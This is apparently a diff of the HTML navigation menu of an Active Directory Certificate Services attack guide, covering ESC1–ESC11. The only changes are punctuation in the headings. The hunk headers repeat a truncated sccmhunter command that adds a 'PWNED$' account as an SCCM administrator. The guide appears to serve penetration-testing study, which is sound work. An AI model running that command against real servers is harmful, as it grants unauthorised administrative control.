 <div class="nested-dropdown-container">
 <a href="#esc1-understanding">11.3.1 Understanding ESC1</a>
 <a href="#esc1-requirements">11.3.2 Abuse Requirements</a>
@@ -19661,7 +19661,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.4 ESC2 -- Any Purpose EKU / No EKU<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.4 ESC2; Any Purpose EKU / No EKU<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc2-understanding">11.4.1 Understanding ESC2</a>
 <a href="#esc2-requirements">11.4.2 Abuse Requirements</a>
@@ -19670,7 +19670,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.5 ESC3 -- Enrollment Agent Template Abuse<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.5 ESC3; Enrollment Agent Template Abuse<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc3-understanding">11.5.1 Understanding ESC3</a>
 <a href="#esc3-requirements">11.5.2 Abuse Requirements (Two Conditions)</a>
@@ -19679,7 +19679,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.6 ESC4 -- Vulnerable Certificate Template Access Control<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.6 ESC4; Vulnerable Certificate Template Access Control<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc4-understanding">11.6.1 Understanding ESC4</a>
 <a href="#esc4-requirements">11.6.2 Modifications Required</a>
@@ -19689,7 +19689,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.7 ESC5 -- Vulnerable PKI Object Access Control<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.7 ESC5; Vulnerable PKI Object Access Control<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc5-understanding">11.7.1 Understanding ESC5</a>
 <a href="#esc5-requirements">11.7.2 Abuse Requirements</a>
@@ -19698,7 +19698,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.8 ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.8 ESC6; EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc6-understanding">11.8.1 Understanding ESC6</a>
 <a href="#esc6-attack">11.8.2 Attack</a>
@@ -19706,7 +19706,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.9 ESC7 -- Vulnerable CA Access Control (ManageCA / ManageCertificates)<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.9 ESC7; Vulnerable CA Access Control (ManageCA / ManageCertificates)<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc7-understanding">11.9.1 Understanding ESC7</a>
 <a href="#esc7-attack-linux">11.9.2 Attack from Linux (ManageCA)</a>
@@ -19716,7 +19716,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.10 ESC8 -- NTLM Relay to AD CS HTTP Endpoints<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.10 ESC8; NTLM Relay to AD CS HTTP Endpoints<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc8-understanding">11.10.1 Understanding ESC8</a>
 <a href="#esc8-requirements">11.10.2 Abuse Requirements</a>
@@ -19725,7 +19725,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.11 ESC9 -- Certificate Mapping Bypass (NoSecurityExtension)<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.11 ESC9; Certificate Mapping Bypass (NoSecurityExtension)<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc9-understanding">11.11.1 Understanding ESC9</a>
 <a href="#esc9-requirements">11.11.2 Abuse Requirements</a>
@@ -19735,16 +19735,16 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.12 ESC10 -- Certificate Mapping Bypass (Weak Registry Keys)<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.12 ESC10; Certificate Mapping Bypass (Weak Registry Keys)<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc10-understanding">11.12.1 Understanding ESC10</a>
-<a href="#esc10-case1">11.12.2 Case 1 -- StrongCertificateBindingEnforcement = 0</a>
-<a href="#esc10-case2">11.12.3 Case 2 -- CertificateMappingMethods = 0x4</a>
+<a href="#esc10-case1">11.12.2 Case 1; StrongCertificateBindingEnforcement = 0</a>
+<a href="#esc10-case2">11.12.3 Case 2; CertificateMappingMethods = 0x4</a>
 <a href="#esc10-remediation">11.12.4 Remediation</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.13 ESC11 -- NTLM Relay to AD CS ICPR (RPC) Endpoints<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.13 ESC11; NTLM Relay to AD CS ICPR (RPC) Endpoints<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
 <a href="#esc11-understanding">11.13.1 Understanding ESC11</a>
 <a href="#esc11-requirements">11.13.2 Abuse Requirements</a>
